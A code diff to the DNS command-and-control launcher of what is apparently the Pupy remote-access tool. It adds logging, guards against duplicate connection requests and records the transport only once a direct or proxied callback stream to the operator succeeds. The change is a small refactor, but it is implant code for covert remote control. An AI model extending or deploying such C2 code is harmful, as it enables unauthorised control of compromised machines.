@@ -93,20 +93,21 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         pass
 
     def on_connect(self, ip, port, transport, proxy=None):
-        import pupy
+        logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
         with self.lock:
+            if self.stream:
+                logging.debug('ignoring connection request. stream = {}'.format(self.stream))
+                return
+
             self.commands.append(('connect', ip, port, transport, proxy))
             self.new_commands.set()
 
-            pupy.infos['transport'] = transport
-
     def on_disconnect(self):
-        import pupy
+        logging.debug('disconnect request [stream={}]'.format(self.stream))
         with self.lock:
             if self.stream:
                 self.stream.close()
-
-            pupy.infos['transport'] = ''
+                self.stream = None
 
     def on_exit(self):
         with self.lock:
@@ -219,6 +220,8 @@ class DNSCncLauncher(BaseLauncher):
 
 
     def iterate(self):
+        import pupy
+
         if self.args is None:
             raise LauncherError('parse_args needs to be called before iterate')
 
@@ -244,14 +247,20 @@ class DNSCncLauncher(BaseLauncher):
                 continue
 
             if command[0] == 'connect':
+                logging.debug('processing connection command')
+
                 with dnscnc.lock:
                     stream = self.try_direct_connect(command)
-                    if stream:
-                        dnscnc.stream = stream
-                        yield stream
-                    else:
+                    if not stream:
                         for stream in self.try_connect_via_proxy(command):
                             if stream:
-                                dnscnc.stream = stream
-                                yield stream
                                 break
+
+                    dnscnc.stream = stream
+
+                if stream:
+                    logging.debug('stream created, yielding - {}'.format(stream))
+                    pupy.infos['transport'] = command[3]
+                    yield stream
+                else:
+                    logging.debug('all connection attempt has been failed')
